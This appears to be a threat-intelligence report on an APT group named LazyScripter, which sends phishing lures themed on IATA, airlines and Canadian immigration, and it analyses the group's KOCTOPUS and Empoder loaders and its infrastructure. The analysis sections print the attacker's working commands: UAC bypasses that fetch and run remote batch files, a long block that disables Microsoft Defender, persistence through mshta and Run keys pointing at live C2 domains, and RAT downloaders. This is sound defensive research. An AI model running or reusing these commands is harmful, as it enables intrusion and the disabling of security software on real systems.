In this paper, we\nintroduce a new APT group we have named LazyScripter, presenting in-depth analysis of the tactics, techniques,\nprocedures, and infrastructure employed by this actor group.\n\nAlthough the observed TTPs have commonality with known actor groups, there are many notable differences\nsetting LazyScripter apart from these groups; these similarities and differences are discussed in the Attribution\nsection of this paper.\n\nAPT groups are traditionally tracked according to specific targets and tools or methodologies they employ. Many\nactor groups use spam campaigns, attaching weaponized documents to phishing emails themed to target the\nindustry or demographic of interest. In this case, we initially discovered a number of malicious emails specifically\ntargeting individuals seeking employment, which prompted a deeper investigation.\nDigging deeper we uncovered a targeted spam campaign dating back as far as 2018 using phishing lures with\nthemes aimed not only at those seeking immigration to Canada for employment, but also at airlines.\n\nIn the following analysis, we walk through the timeline of observed TTPs from the initial phishing campaign to the\nstate of the current and ongoing activities of the actor. We take a deep dive into each of the tools used, including\nthe weaponized documents and the multiple variants of malware and exploitation techniques employed. Finally,\nwe detail the infrastructure used and discuss the attribution comparisons with known actor groups such as APT28\nand Muddy Water.\n\nThis in-depth and detailed analysis has revealed a developing campaign by what we believe to be a previously\nunidentified APT actor. Not only has this campaign been active for several years, but ongoing tracking shows this\nactor is still maintaining the infrastructure used and is actively updating toolsets. For this reason, we continue to\ntrack this new group LazyScripter as the threat evolves.\n\n\n-----\n\n## Introduction\n\nIn late December 2020 we observed a few malicious documents with embedded objects that were designed\nto target job seekers. The embedded objects were either VBScript or batch files that deployed two opensource multi-stage Remote Access Trojans (RATs): Octopus and Koadic. Interestingly, in some cases the\nattacker managed to drop other RATs such as LuminosityLink, RMS, Quasar, njRat and Remcos.\n\nThis triggered our interest to further investigate this threat actor to understand its activities over the past\nfew years. We were able to track them back to at least 2018 with a campaign targeting victims looking to\nimmigrate to Canada. Over time they have used different file types as their initial lures, and they have\nswitched their main toolset from PowerShell Empire to double RAT (Koadic and Octopus).\n\nThis threat actor is targeting the International Air Transport Association (IATA) and airlines in which we\nobserved several different lures specifically designed to target airlines that are using the BSPLink software.\nMost recently we observed that they have changed their lure to mimic a new feature recently introduced by\nIATA called IATA ONE ID (Contactless Passenger Processing tool). This indicates that this actor is constantly\nupdating its toolsets to target new systems developed by IATA.\n\n\n-----\n\n## Phishing\n\nIn all their phishing lures the actor has used its loader to spawn a combination of Octopus and Koadic (there\nwere only a few cases with Koadic only). We were able to identify several different variants of this loader:\nexecutable, batch, VBScript, and registry files (in which persistence is achieved by writing a PowerShell script\ninto the AutoRun registry key). We named this new loader as KOCTOPUS.\n\nThis group also has used another loader around 2018 and 2019 to load PowerShell Empire. We named this\nloader Empoder.\n\nAs a phishing lure they mainly used either IATA- or job-related themes to target victims. However, we have\nobserved several other phishing lures that have been used by this actor. Here are some of them:\n\n  - IATA security (International Air Transport Association security)\n\n  - BSPlink Updater or Upgrade (BSPlink is the global interface for travel agents and airlines to access the\nIATA Billing and Settlement Plan (BSP)).\n\n  - IATA ONE ID\n\n  - User support kits for IATA users\n\n  - Tourism (UNWTO)\n\n  - COVID-19\n\n  - Microsoft Updates\n\n  - Job information\n\n  - Canada skill worker program\n\n  - Canada Visa (CanadaVisa.com is the online presence of the Campbell Cohen Immigration Law Firm)\n\nAnother interest of this actor is targeting people that want to immigrate to Canada through government jobrelated programs. In one of the specific cases the actor has used the legitimate \"Canadavisa.com\" site as its\nphishing lure. Canadavisa is a known Canadian immigration website associated with an immigration firm\nbased in Montreal, Canada.\n\nThis actor has mainly used spam emails weaponized with either archive or document files as it is initial\ninfection vector. Both zip and document files contain a variant of either KOCTOPUS or Empoder and in some\ncases they are password protected.\n\nThe actor has mainly used two GitHub accounts to host its toolsets. Both of these accounts were deleted on\nJan 12 and 14 2021, respectively.\n\n  - https://github[.]com/Axella49\n\n  - https://github[.]com/LIZySARA\n\n\n-----\n\nFigure 1: GitHub account belonging to threat actor\n\nThe actor created a new GitHub account on Feb 2nd 2021 to host its payloads to operate its new spam campaign:\n\nFigure 2: New GitHub repository\n\n\n###### Timeline of activities and phishing lures\n\n\nWe were able to collect some of the spam emails used by this actor over the past two years. In these spam emails\nthe actor used several methods to redirect the user to download a variant of KOCTOPUS. The latest campaign was\nspotted on Feb 5th, 2021 in which the actor was distributing a variant of KOCTOPUS pretending to be “BSPLink\nUpgrade.exe” and managed to drop a variant of Quasar Rat in addition to OCTOPUS and Koadic.\nPrior to that we have spotted another campaign on Jan 6th, 2021 in which the actors were distributing a variant of\nKOCTOPUS pretending to be “IATA ONE ID.exe” software:\n\n\n-----\n\nFigure 3: Latest spam campaign\n\n\nFigure 4: Latest spam campaign\n\n\nHere is the list of different lures used by this actor:\n\n\n\n- KOCTOPUS has been archived and distributed as an email attachment to victims.\n\n\n-----\n\nFigure 5: Spam email variant 1\n\n\nFigure 6: Spam email variant 2\n\n\n\n- The spam email contains a PDF file with a link to download a variant of KOCTOPUS.\n\n\nFigure 7: Spam email variant 3\n\n\n-----\n\nFigure 8: Attached PDF file\n\n\n\n- The spam email contains a link that redirects the victim to download KOCTOPUS or a maldoc that has an\nembedded KOCTOPUS. The link usually is a URL shortener link using shortener services such as bit.ly or\ncutt.ly that redirects victims to either the attackers’ Github repository or the IP/URL address that hosts\nthe maldoc.\n\n\nFigure 9: Spam email variant 3\n\n\nOn March 19th 2020, SANS ISC InfoSec Forums reported a multistage attack that took advantage of the COVID-19\npandemic to distribute its malware. This reported maldoc contains a variant of the KOCTOPUS malware we\nuncovered in this paper. In that phishing email the actor spoofed the World Health Organization and pretends to\nprovide recommendations.\n\nWe were able to identify multiple themes used by this actor and the time they have been used in spam campaigns.\nThe following image shows the time frames of the different lures used by the actor.\n\n\n-----\n\nFigure 10: Lures timeline\n\n\n-----\n\n###### Document analysis\n\n\nUnlike most actors that are using macros in their documents to perform malicious activities, this actor has\nembedded objects that are one of the KOCTOPUS or Empoder variants.\n\n\nWe identified 14 malicious documents that have been used by this actor since 2018:\n\n\nFigure 11: List of maldocs used by this actor\n\n\nThe malicious documents usually have one or two embedded objects with either PDF, Microsoft Word or Excel\nicons to pretend they are another document embedded in the doc while in fact they are either batch, executable,\nor VBScript variants of KOCTOPUS or Empoder.\n\n\n-----\n\nFigure 12: Doc Template 1\n\n\n-----\n\nFigure 13: Doc Template 2\n\n\n###### Archive analysis\n\n\nThe actor has not only relied on maldocs to deliver its loaders but also used archive files that have embedded a\nvariant of KOCTOPUS or Empoder. The following shows the list of archive lures used by this actor since 2018:\n\n\n-----\n\nFigure 14: List of archive files and their embedded objects\n\n\n-----\n\n## KOCTOPUS Analysis\n\nThe actor has used this loader to load Octopus and Koadic and in some cases other RATs such as LuminosityLink\nRMS and Quadar RAT. This loader has four different variants which we will describe below.\n\n\n###### Batch Variant\n\n\nThe batch files used by this actor are highly obfuscated with the BatchEncryption tool. BatchEncryption is an\nadvanced batch obfuscation tool that uses a combination of known and custom environment variable encoding\ntechniques.\n\n\nFigure 15: Overall Process\n\n\nIn this section we provide the analysis of a batch file embedded within the most recent maldoc used by this actor.\nThe following shows the obfuscated version of KOCTOPUS:\n\n\nFigure 16: KOCTOPUS Batch Variant Obfuscated\n\n\nFigure 17 shows the list of commands that will be executed by this loader after de-obfuscation.\n\n\nFigure 17: KOCTOPUS Batch Variant Not Obfuscated\n\n\n-----\n\nThis loader starts it activities by checking the OS version using the following command:\n\n```\n for /f \"tokens=2 delims=,\" %%i in ('wmic os get caption^,version\n /format:csv') do set os=%%i\n\n```\nThen it looks for number 10 using the find command to identify if the OS is Windows 10. If that is the case, it\nattempts to bypass User Access Control (UAC) using fodhelper.exe and execute its commands with higher privilege.\nIf the OS version is not 10, it performs UAC bypass through Event Viewer (eventvwr.exe).\n\n_Fodhelper.exe has been used in Windows 10 to manage language settings. Since this process is running with_\nhighest privilege, an attacker can abuse it to execute its malicious commands with the same\nprivilege fodhelper has. When the fodhelper.exe process starts it looks for the three registry keys shown below that\nby default do not exist. Therefore, an attacker can write its malicious commands in these registry keys to be\nexecuted by fodhelper.exe with the highest privilege.\n```\n HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\n HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute\n HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\\(default)\n\n```\n\nThis loader has created these registry keys with a PowerShell command:\n\n```\n&& reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v\n\"DelegateExecute\" /f && reg add HKCU\\Software\\Classes\\mssettings\\shell\\open\\command /d \"cmd.exe /c powershell -WindowStyle Hidden command \\\"IEX (New-Object\nNet.WebClient).DownloadFile('http://23.98.155.192/sc.bat',,\n'C:\\Users\\Public\\Libraries\\sc.bat');\\\" C:\\Users\\Public\\Libraries\\sc.bat\" /f\n\n```\n\nTo execute the PowerShell command, fodhelper.exe needs to be executed:\n\n```\n&& START /W fodhelper.exe\n\n```\n\nUpon fodhelper execution, PowerShell is executed to download a batch file from a remote server and save it into\nthe Libraries directory and finally execute it. At the end the loader performs the cleanup procedure by deleting the\ncreated registry keys with the following command:\n\n```\n&& reg delete HKCU\\Software\\Classes\\ms-settings /f\n\n```\n\nIf the OS version is not 10, Event Viewer is used to bypass UAC. When eventvwr.exe is executed it looks\nfor mmc.exe in these two registry locations:\n```\n HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\n HKCR\\mscfile\\shell\\open\\command\n\n```\nSince the first registry key does not exist then mmc.exe is executed from the second location to load\nthe eventvwr.msc file in order to display the information to the user. An attacker can create this registry key that\ndoesn’t exist in order to execute malicious commands with administrative privileges. In this case the actor has\ncreated this registry key with the same PowerShell command as described in the fodhelper.exe bypass.\n```\n reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"cmd.exe\n /c powershell -WindowStyle Hidden -command \\\"IEX (New-Object\n Net.WebClient).DownloadFile('http://23.98.155.192/sc.bat',\n 'C:\\Users\\Public\\Libraries\\sc.bat');\\\" C:\\Users\\Public\\Libraries\\sc.bat\" /f\n\n```\n\n-----\n\nThe downloaded batch file (sc.bat) has also been obfuscated using the BatchEncryption tool. After deobfuscation\nwe can see this batch performs the following steps:\n\n  - Using reg.exe to disable, add or delete all registry keys related to Microsoft Defender and Microsoft\nSecurity Essentials. Also, it disables all the Scheduled tasks related to these security products by\ncalling schtasks:\n```\n reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f \n reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v\n \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f \n reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v\n \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f \n reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v\n \"MpEnablePus\" /t REG_DWORD /d \"0\" /f \n reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time\n Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f \n reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time\n Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f \n reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time\n Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f \n reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time\n Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f \n reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time\n Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f \n reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v\n \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f \n reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v\n \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f \n reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v\n \"SpynetReporting\" /t REG_DWORD /d \"0\" /f\n reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v\n \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f \n reg add\n \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v\n \"Start\" /t REG_DWORD /d \"0\" /f \n reg add\n \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\"\n /v \"Start\" /t REG_DWORD /d \"0\" /f \n schtasks /Change /TN \"Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy\n Refresh\" /Disable\n schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender\n Cache Maintenance\" /Disable\n schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender\n Cleanup\" /Disable \n schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender\n Scheduled Scan\" /Disable \n schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender\n Verification\" /Disable \n reg delete\n \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\n \" /v \"Windows Defender\" /f \n reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Windows\n Defender\" /f \n reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v\n \"WindowsDefender\" /f \n reg delete \"HKCR\\*\\shellex\\ContextMenuHandlers\\EPP\" /f \n\n```\n\n-----\n\n```\n reg delete \"HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP\" /f \n reg delete \"HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP\" /f reg add\n \"HKLM\\System\\CurrentControlSet\\Services\\WdBoot\" /v \"Start\" /t REG_DWORD /d\n \"4\" /f \n reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdFilter\" /v \"Start\" /t\n REG_DWORD /d \"4\" /f \n reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisDrv\" /v \"Start\" /t\n REG_DWORD /d \"4\" /f \n reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisSvc\" /v \"Start\" /t\n REG_DWORD /d \"4\" /f \n reg add \"HKLM\\System\\CurrentControlSet\\Services\\WinDefend\" /v \"Start\" /t\n REG_DWORD /d \"4\" /f \n reg add \"HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\" /v\n \"Start\" /t REG_DWORD /d \"4\" /f \n reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n /v EnableLUA /t REG_DWORD /d 0 /f \n reg add \"HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\" /v\n \"Start\" /t REG_DWORD /d \"4\" /f \n reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n /v EnableLUA /t REG_DWORD /d 0 /f\n\n```\n  - Calling PowerShell.exe to download another batch file. The actor has used another URL shortener “is.gd”\nwhich redirects to a Github repository to download that batch file:\n```\n powershell -WindowStyle Hidden -command \"IEX (New-Object\n Net.WebClient).DownloadFile('https://is.gd/xbQIQ2','C:\\Users\\Public\\Librarie\n s\\pus.bat');\" C:\\Users\\Public\\Libraries\\pus.bat\n\n```\nThe pus.bat script is also obfuscated by the BatchEncryption tool and executes the following PowerShell command.\nThis command connects to its server to deploy its first multi-stage RAT which is Octopus:\n```\n powershell -w hidden \"Add-Type -AssemblyName System.Core;IEX (New-Object\n Net.WebClient).DownloadString('http://hpsj.firewall gateway.net:80/hpjs.php');\"\n\n```\n  - Performing the following actions which in fact make both Octopus and Koadic persistence through both\nthe AutoRun registry key and scheduled task.\n\n\n###### Koadic Persistence:\n\n```\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v\n\"#OneDrive\" /t REG_SZ /d \"cmd /c powershell -w hidden \\\"Add-Type AssemblyName System.Core;IEX (New-Object\nNet.WebClient).DownloadString('http://hpsj.firewallgateway.net:80/hpjs.php');\\\"\"\nPowershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile noexit -c Invoke-Command -ScriptBlock { schtasks /create /TN\nAutomaticChromeUpdater /TR 'mshta http://hpsj.firewallgateway.net:8080/MicrosoftUpdate' /SC minute /mo 60}\n\"C:\\WINDOWS\\system32\\schtasks.exe\" /create /TN AutomaticChromeUpdater /TR\n\"mshta http://hpsj.firewall-gateway.net:8080/MicrosoftUpdate\" /SC minute /mo\n60\n\n```\n\n-----\n\n###### Octopus Persistence:\n\n```\n reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v\n \"New Value #1\" /t REG_SZ /d \"mshta http://hpsj.firewall gateway.net:8080/MicrosoftUpdate\" /f powershell Add-MpPreference  ExclusionPath \"C:\" -FORCE\n Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile  noexit -c Invoke-Command -ScriptBlock { schtasks /create /TN AutomaticU /TR\n 'C:\\Users\\Public\\Libraries\\pus.bat' /SC minute /mo 120}\n \"C:\\WINDOWS\\system32\\schtasks.exe\" /create /TN AutomaticU /TR\n C:\\Users\\Public\\Libraries\\pus.bat /SC minute /mo 120\n\n```\nThe first PowerShell command downloads the Octopus PowerShell agent from the following URL:\nhttp://hpsj[.]firewall-gateway[.]net:80/hpjs.php. This agent has been obfuscated by the attacker.\n\nFigure 18: Loading Koadic\n\nThe Octopus agent is responsible for communicating with its C&C server to send and receive commands. To start\nits communications, it collects the following information from the victim machine:\n\n\n\n- Host name (with the addition of five random characters to the end)\n\n\n\n- User name (if the user name has the administrator role it adds “*” to it)\n\n\n\n- OS version\n\n\n\n- OS architecture\n\n\n\n- The process id that is executing this PowerShell script\n\n\n\n- Victim’s Network domain\n\n\nThen it builds a header with the following format:\n\n\n-----\n\n```\n $HEADER = \"$hostname, $username, $OS_version, $OS_arch, $process_id, $domain\"\n\n```\nIn the next step, it encrypts the header using AES encryption and then encodes the generated encrypted header\nusing Base64. The Key and IV for encryption are Base64 hardcoded.\n\n\nFigure 19: Encryption function\n\n\nThen it sends an HTTP get request to its server with the generated header as authorization header field.\n\n\nFigure 20: Http get request\n\n\nAfter sending the request, it goes into a loop to receive commands from the server. The received commands are\nspecific to the victim and the generated URL is the combination of the C&C URL and generated host name. The\nreceived commands are Base64 encoded and AES encrypted and therefore it first decodes and decrypts the\ncommands and then based on the commands it does the required actions.\n\n\n-----\n\nFigure 21: Commands\n\n\nHere is the list of commands:\n\n\n\n- False: If the command is False it does nothing.\n\n\n\n- Report: It collects victim’s info including list of all of the running processes, local IP address, OS version,\nlast boot time, OS locale and current time and then encrypts and Base64 encodes them and sends them in\nthe authorization HTTP field to the server.\n\n\n\n- Download: Upload the content of a specified file to the server.\n\n\n\n- reset-pc: It seems this feature is not still implemented.\n\n\nIt also deploys another variant of Octopus agent through JavaScript (mshta http://hpsj[.]firewall_gateway[.]net:8080/hta). This script calls the PowerShell to download the Octopus agent._\n\n\n-----\n\nFigure 22: Js script\n\n\nFigure 23: PowerShell command after deobfuscation\n\n\nAfter deploying Octopus it deploys Koadic by calling mshta:\n\n```\n\"mshta http://hpsj.firewall-gateway.net:8080/MicrosoftUpdate\" /f powershell\nAdd-MpPreference -ExclusionPath \"C:\" -FORCE \n\n```\n\nThe actor has used mshta and rundll32.exe for Koadic stagers.\n\n```\n \"C:\\Windows\\System32\\rundll32.exe\" http://hpsj.firewall gateway.net:8080/MicrosoftUpdate?PPVXCF8Y4U=2368b7b9facb4a3b8acf72d29ea28704\n ;UGH09GLI5P=;\\..\\..\\..\\./mshtml,RunHTMLApplication\n\n```\nFigure 24 shows the downloaded first stage. This script defines 4 random strings with the following sizes: 101, 118,\n97, and 108. These strings’ lengths have been used to build the “eval” by converting each string size number to\nchar.\n\nIn the next step the obfuscated script that will be executed by eval is deobfuscated by passing it to the\ndeobfuscation function (jRclebKBKY). At the end that deobfuscated script is executed by calling eval.\n\n\n-----\n\nFigure 24: Downloaded js\n\n\nFigure 25: Deobfuscated js\n\n\nThe deobfuscated script collects the following information from the victim and then builds a URL and command\nand makes an HTTP request to the Koadic server.\n\n\n\n- Checks SeDebugPrivilege through “whoami /all” command\n\n\n\n- Gets OS version and Build by reading their relative registry locations\n\n\n\n- Gets group policy history through reading registry location\n\n\n\n- Gets processor architecture\n\n\n\n- Lists directories in temp folder\n\n\n\n- Gets the contents of the IP routing table by executing the “route print” command\n\n\n\n- Gets computer name and username\n\n\n\n- Gets Windows code page\n\n\n-----\n\nFigure 26: Data collection\n\n\nIn this case, we observed that Koadic acted as a downloader to download and execute RMS, LuminosityLink. In\nsome other cases, the actor used Koadic to drop njRat, Remcos and Quasar RAT.\n```\n \"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -WindowStyle\n Hidden -command \"& { (New-Object\n Net.WebClient).DownloadFile('https://cutt.ly/0hakgDJ',\n 'C:\\Users\\Public\\Libraries\\1.exe')};\" C:\\Users\\Public\\Libraries\\1.exe\n \"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -WindowStyle\n Hidden -command \"& { (New-Object\n Net.WebClient).DownloadFile('https://cutt.ly/agV2Ekk',\n\n```\n\n-----\n\n```\n'C:\\Users\\Public\\Libraries\\Setup-RMS.exe')};\"\nC:\\Users\\Public\\Libraries\\Setup-RMS.exe\n@echo off\ntaskkill /f /im rutserv.exe\ntaskkill /f /im rfusclient.exe\nreg delete \"HKLM\\SYSTEM\\Remote Manipulator System\" /f\nattrib +s +h \"C:\\Windows\\System32\\vipcatalog\"\ncd C:\\Windows\\System32\\vipcatalog\\\n\"rutserv.exe\" /silentinstall\nregedit /s regedit.reg\n\"rutserv.exe\" /start\n@exit\n\n```\n\n###### Ngrok\n\n\nWe have observed some other variants of KOCTOPUS where the actor first deployed a modified version of [Invoke-](https://github.com/benyG/Invoke-Ngrok)\n[Ngrok](https://github.com/benyG/Invoke-Ngrok) which is a PowerShell script that exposes local ports of a victim over the internet. This script has an\nembedded Base64 encoded payload that is decoded and stored in the Libraries directory pretending to\nbe RuntimeBroker.exe. This dropped payload achieved persistence through the AutoRun registry key and a\nscheduled task.\n\n\nAfter deploying Ngrok, the loader has deployed both Octopus and Koadic RATs.\n\n\n-----\n\nFigure 27: Invoke Ngrok\n\n###### ADS-Backdoor\n\nIn another case, we observed that the actor has tried to use the ADS-Backdoor which is a backdoor persistent\nmodule of [Nishang](https://github.com/samratashok/nishang) Framework. Nishang is an open-source PowerShell-based framework for offensive security,\npenetration testing, and red teaming.\n```\n powershell.exe -exec bypass -c \"IEX (New-Object\n Net.WebClient).DownloadString('https://cutt.ly/nfPs6qP'); Checking -URL\n https://cutt.ly/0fPs6VQ -Arguments \"CHECK\"\"\n\n```\n\n-----\n\nFigure 28: ADS-Backdoor\n\n\n###### Executable Variant\n\n\nWe were able to find 7 executables associated with KOCTOPUS. All of these executables have been compiled using\nPure Basic and have the same compile date (February 1st 2018) and almost all of them were recently uploaded to\nVirusTotal.\n\nHaving the same compile time might indicate that they have been developed or modified by an automated tool.\nAfter further analysis we identified that all of these samples have been generated using a Bat to Exe Converter\ntool. In fact, the actor has used a tool to convert its batch loader to an executable. The compile time is predefined\nin this application and does not show the right compilation time. We believe the right compilation time is around\nthe time that the sample has been uploaded to VirusTotal.\n\n\n-----\n\nFigure 29: Bat to exe convertor\n\n\nThe samples are using different names to pretend they are legitimate applications. Here are some of the names\nused by these samples:\n\n  - “IATA ONE ID.exe”: This has been distributed through a spam campaign on Jan 6[th], 2021. It is using\nthe IATA ONE ID icon to pretend it is that software. ONE ID is a fairly recent concept introduced by IATA\nfor contactless identity management that leverages biometric technology. This indicates that this actor is\nconstantly monitoring new IATA technologies to update its toolsets respectively.\n\n  - “BSPlinkUpdaterV4.exe”: Similar to the “IATA ONE ID” this has been specifically designed to target airlines\nthat are using BSPLink software.\n\n  - “Federal Skilled Worker Program Eligible Occupations Canada Immigration and Visa Information\nCanada.exe”: This is designed to target people that are applying to the Canada skill worker program. The\nactor has used decoy documents from a Canada Immigration website (Figure 30 and Figure 31).\n\n\n-----\n\nFigure 30: Decoy document\n\n\n-----\n\nFigure 31: Decoy document\n\n\nThe actor has used several different icons for these executables. Among them we observed one that is an old\nMalwarebytes icon possibly pretending to be our security software.\n\n\n-----\n\nFigure 32: Used icons\n\n\nThis Bat to Exe Converter encrypts the batch loader into its resource section. The executable loads the resource,\ndecrypting its content and then executing the batch file.\n\n\nHere is the main process of this loader:\n\n\n\n- It creates a directory in the %APPDATA%/Temp directory and then creates a batch file in that directory.\nThe name of the directory and batch files are generated randomly.\n\n\nFigure 33: Create Directory\n\n\n\n- It looks for resources by their hashes and loads them using the LoadResource API call. This executable\ncontains 2 resources. One of them has been used to generate a key for the RC4 encryption algorithm. The\nother one is the batch file content that has been encrypted.\n\n\n-----\n\nFigure 34: Load Resource\n\n\n\n- It generates the RC4 key from the resource.\n\n\n\n- It decrypts the content of the other resource and writes it into that created batch file. (The encryption key\nis 6A2148ADADF8D6E529B08D8BD0800A85).\n\n\n\n- It calls cmd.exe to execute the generated bat file using CreateProcessW.\n\n\nFigure 35: RC4 decryption\n\n\n-----\n\n###### Vbscript Variant\n\n\nThe KOCTOPUS vbscript variant has the same functionality as we mentioned in the batch variant with the\ndifference that process execution has been started by a VBScript that calls wscript to execute a PowerShell\ncommand. This PowerShell command downloads the batch variant of KOCTOPUS. All of the VBScript files are\nobfuscated to make analysis more difficult.\nIn the VBA variant, the actor has used the URL shortener cutt.ly to hide its real URL which in this case is a GitHub\nrepository hosted at raw.githubusercontent.com.\n```\n \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -WindowStyle\n Hidden -command \"IEX (New-Object\n Net.WebClient).DownloadFile('https://cutt.ly/fgOTMj0',,\n 'C:\\Users\\Public\\Libraries\\reguac.bat');\"\n C:\\Users\\Public\\Libraries\\reguac.bat\n\n```\n\n###### Registry key variant\n\n\nThis variant sets the AutoRun registry key with a Powershell command that downloads and executes the batch\nvariant of KOCTOPUS.\n\n\nFiigure 36: Reg variant\n\n\n###### Empoder\n\n\nPrior to using Koadic as the main RAT this actor has used PowerShell Empire as its main toolset. To load PowerShell\nEmpire the actor has used its Empire Loader which we call Empoder.\n\n\nFigure 37: WinRaR installer\n\n\nIn fact, the actor has just used a VBS file to load PowerShell Empire, but it has wrapped its VBS into a WinRar\ninstaller which is usually bundled with a decoy document. As an example, “Canada Visa.exe” is a WinRar installer\nthat has two bundled files: a VBS file and a decoy PDF document. This one is specifically designed to target users of\nCanada Visa, a Canadian immigration law firm based in Montreal, Canada. The decoy document was taken from\nthe Canada Visa website.\n\n\n-----\n\nFigure 38: Canada Visa decoy document\n\n\n-----\n\n## Infrastructure\n\nThe actor has leveraged dynamic DNS providers for command-and-control communications. Dynamic DNS\nproviders allow people to create free subdomains on shared domains and as you can see the actor has created five\nsubdomains on four different dynamic DNS domains for the communications.\n\n\n\n- kasperskylab.ignorelist.com\n\n\n\n- hpsj.firewall-gateway.net\n\n\n\n- googlechromeupdater.twilightparadox.com\n\n- iatassl-telechargementsecurity.duckdns.org\n\n\n\n- stub.ignorelist.com\n\n\nFigure 39: Infrastructure\n\n\n-----\n\n## Attribution\n\nWe have examined TTPs, toolsets and infrastructure used by this actor to attribute it to any of the known threat\nactors.\n\nEven though some similarities between this actor and documented APT actors such as APT28 and OilRig exist,\nthese indicators are not enough to attribute to any of these groups.\n\n  - [APT28 has used Koadic Rat in its past campaigns; the only similarity between them is the use of Koadic](https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/)\nopen-source tool which is not a strong indicator to show any connections between them.\n\n  - [OilRig](https://unit42.paloaltonetworks.com/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/) has used the batch to exe tool to convert its PowerShell scripts into executables. This is a good\nindicator that can show there is some overlap between this actor and OilRig but there are still some\nmajor differences between them that makes us believe they are separate groups.\n\nThe most similar APT actor to the actor we analyzed in this report is Muddy Water. Here is the list of similarities\nbetween them:\n\n\n\n- Both have used Koadic and Empire in their previous campaigns\n\n\n\n- Both have used scripting languages such as PowerShell in their campaigns\n\n\n\n- Both have used GitHub to host their malicious payloads/scripts. Similar to Muddy Water this actor has\nadded forks of some popular toolsets to add some legitimacy to its Github account\n\n\n\n- Both have used scheduled tasks and Registry Run Keys / Startup Folder for persistence\n\n\nHowever, there are some key differences between them:\n\n\n\n  - Muddy Water has employed targeted spear phishing attacks to perform its operations while this actor\nrelies on spam campaigns\n\n  - This actor has employed several open-source frameworks and commercial malware such as Octopus,\nNishang, Quasar, Remcos, njRAT, RMS, NetWire and LumosityLink RAT that have not been used by Muddy\nWater\n\n  - Unlike Muddy Water that has used macro-weaponized maldocs, this actor has not used macro-embedded\ndocuments and instead it directly embeds its loader within the maldocs\n\n  - Muddy Water has used some custom toolsets such as PowerStats and SharpStats while this actor mainly\nrelies on open-source toolsets to perform its operations\n\nIn terms of used infrastructure, we have seen several APT groups that have used dynamic DNS for their C&C\ncommunications including Scarlet Mimic, Putter Panda, Turla, Patchwork and APT33. More specifically Scarlet\nMimic and Putter Panda have used the same free DNS provider “firewall-gateway.net” for their C&C\ncommunications. Still, we have not found any other similarities between these APTs and the actor we analyzed in\nthis report except using a free DNS provider which is not reliable in the attribution process.\n\nBased on the differences we provided in this section we believe this is a new actor that has not been documented\nbefore and therefore we have decided to track this actor as a new group that we call LazyScripter.\n\n\n-----\n\n## Conclusion\n\nIn this paper, we uncovered several campaigns associated to an actor group that we believe has been active since\n2018. Here are its main characteristics:\n\n  - Uses 